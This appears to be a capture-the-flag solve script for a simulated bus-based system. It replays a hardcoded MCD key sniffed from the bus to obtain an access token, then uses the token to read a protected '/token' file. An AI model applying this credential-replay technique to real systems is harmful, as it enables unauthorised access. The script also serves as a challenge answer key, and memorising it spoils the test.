'''
    By modifying, debugging, or hooking and introspecting the challenge at
    runtime, the user can observe the MCD's key as it transits the bus. By
    stealing this key (hardcoded credentials), an attacker can make requests of
    the FSD with the permissions of the MCD.
'''

import jaeger_lib
import os
import sys

HOST = os.environ["HOST"]
PORT = int(os.environ["PORT"])

serial = jaeger_lib.Serial(HOST, PORT)

serial.relay_privileged_bus()

MCD_KEY = b"\xd4\xda\x05\xa7\x5a\x5b\xdc\x44\xe8\x2f\x08\x18\x60\xdb\x88\xf0"
MCD_PERMISSIONS = b"\x01"
ACCESS_TOKEN_CREATE_REQUEST = b"\x00"

serial_proto = jaeger_lib.SerialProto(serial, 7)
serial_proto.send_stream(1, ACCESS_TOKEN_CREATE_REQUEST + MCD_PERMISSIONS + MCD_KEY)

# We now wait for a response
response = serial_proto.receive()

# The second byte should have the 0x80 bit set, indicating success
TOKEN = None
if response.data[1] & 0x80 == 0x80:
    print("Got token for key")
    token = response.data[2:10]
else:
    print("Failed to get token for key")
    sys.exit(1)

print("token:", token.hex(), len(token))

serial_proto.serial.relay_rf_comms_bus()

file_contents = jaeger_lib.fsp.get_file_contents(serial_proto, 4, token, b"/token\x00")
assert(file_contents.success)
print("Got /token file:", file_contents.contents)